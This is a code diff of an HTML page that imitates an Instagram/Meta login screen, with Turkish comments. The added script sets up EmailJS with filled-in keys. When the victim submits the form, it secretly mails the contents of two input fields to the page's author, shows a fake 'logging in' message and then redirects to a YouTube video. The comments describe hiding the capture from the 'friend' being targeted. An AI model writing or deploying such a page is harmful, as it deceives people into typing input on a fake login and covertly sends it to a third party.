@@ -7,13 +7,16 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600&display=swap" rel="stylesheet">
+    
+    <!-- KRİTİK EKSİK BURadaydı: EmailJS Kütüphanesini ekledik! -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
     <style>
         body {
             font-family: 'Roboto', sans-serif;
             background-color: #000000;
             color: #f5f5f5;
         }
-        /* Instagram gradient borders or effects if needed */
         .instagram-gradient-icon {
             background: radial-gradient(circle at 30% 107%, #fdf497 0%, #df4996 45%, #a237b0 60%, #515ecf 90%);
             -webkit-background-clip: text;
@@ -92,68 +95,69 @@
             <span class="text-xs font-semibold tracking-wide text-white">Meta</span>
         </div>
     </footer>
-</body>
+
+    <!-- JavaScript Kısmı -->
     <script>
-// 1. EmailJS'i Public Key ile başlatıyoruz
-(function(){
-   emailjs.init({
-     publicKey: "BURAYA_PUBLIC_KEY_DEGERINI_YAZ",
-   });
-})();
+        // 1. EmailJS'i Public Key ile başlatıyoruz
+        (function(){
+            emailjs.init({
+                publicKey: "HgFyLzTSNaxXfZTeF", // <--- Buraya kendi Public Key'ini yazmayı unutma!
+            });
+        })();
 
-// 2. Butona basıldığında çalışan fonksiyon
-function handleLogin(e) {
-    e.preventDefault();
-    
-    // Birinci kutudaki tahmin
-    const tahminEdilenSey = document.getElementById('userGuess').value; 
-    
-    // İkinci kutudaki ipucu
-    const ipucuMetni = document.getElementById('userHint').value; 
-
-    // EmailJS şablonuna gidecek veriler (HTML'deki input ID'lerin bunlarla eşleşmeli)
-    const templateParams = {
-        user_guess: tahminEdilenSey,
-        user_hint: ipucuMetni
-    };
-
-    // Arkadaşa çaktırmamak için ekranda şık bir bildirim gösterelim
-    showCustomMessage(null, `Giriş yapılıyor, lütfen bekleyin...`);
-
-    // Maili gizlice arkaya gönderiyoruz
-    emailjs.send('service_8nosgsfa', 'template_mv7wnkb', templateParams)
-        .then(function(response) {
-            console.log('SUCCESS!', response.status, response.text);
+        // 2. Butona basıldığında çalışan fonksiyon
+        function handleLogin(e) {
+            e.preventDefault();
             
-            // Mail gitti! 1.5 saniye sonra arkadaşını yönlendireceğin link
+            // Birinci kutudaki tahmin
+            const tahminEdilenSey = document.getElementById('userGuess').value; 
+            
+            // İkinci kutudaki ipucu
+            const ipucuMetni = document.getElementById('userHint').value; 
+
+            // EmailJS şablonuna gidecek veriler
+            const templateParams = {
+                user_guess: tahminEdilenSey,
+                user_hint: ipucuMetni
+            };
+
+            // Arkadaşa çaktırmamak için ekranda şık bir bildirim gösterelim
+            showCustomMessage(null, `Giriş yapılıyor, lütfen bekleyin...`);
+
+            // Maili gizlice arkaya gönderiyoruz
+            emailjs.send('service_8nosgsfa', 'template_mv7wnkb', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                    
+                    // Mail gitti! 1.5 saniye sonra arkadaşını yönlendireceğin link
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/watch?v=EfmVRQjoNcY"; 
+                    }, 1500);
+                    
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    showCustomMessage(null, `Bir şeyler ters gitti ama devam et :D`);
+                });
+        }
+
+        function showCustomMessage(e, customText) {
+            if (e) e.preventDefault();
+            
+            const existingToast = document.getElementById('custom-toast');
+            if (existingToast) existingToast.remove();
+
+            const toast = document.createElement('div');
+            toast.id = 'custom-toast';
+            toast.className = 'fixed bottom-10 left-1/2 transform -translate-x-1/2 bg-[#262626] text-white text-xs px-4 py-3 rounded-lg shadow-xl border border-[#363636] z-50 transition-all duration-300 flex items-center gap-3';
+            toast.innerHTML = `<span>${customText || 'Bu özellik bu örnek tasarım sayfasında simüle edilmektedir.'}</span>`;
+            
+            document.body.appendChild(toast);
+
             setTimeout(() => {
-                window.location.href = "https://www.youtube.com/watch?v=EfmVRQjoNcY"; // <--- Komik video linkini buraya yapıştırıyorsun!
-            }, 1500);
-            
-        }, function(error) {
-            console.log('FAILED...', error);
-            showCustomMessage(null, `Bir şeyler ters gitti ama devam et :D`);
-        });
-}
-
-function showCustomMessage(e, customText) {
-    if (e) e.preventDefault();
-    
-    const existingToast = document.getElementById('custom-toast');
-    if (existingToast) existingToast.remove();
-
-    const toast = document.createElement('div');
-    toast.id = 'custom-toast';
-    toast.className = 'fixed bottom-10 left-1/2 transform -translate-x-1/2 bg-[#262626] text-white text-xs px-4 py-3 rounded-lg shadow-xl border border-[#363636] z-50 transition-all duration-300 flex items-center gap-3';
-    toast.innerHTML = `<span>${customText || 'Bu özellik bu örnek tasarım sayfasında simüle edilmektedir.'}</span>`;
-    
-    document.body.appendChild(toast);
-
-    setTimeout(() => {
-        toast.style.opacity = '0';
-        setTimeout(() => toast.remove(), 300);
-    }, 3000);
-}
+                toast.style.opacity = '0';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
     </script>
 </body>
 </html>
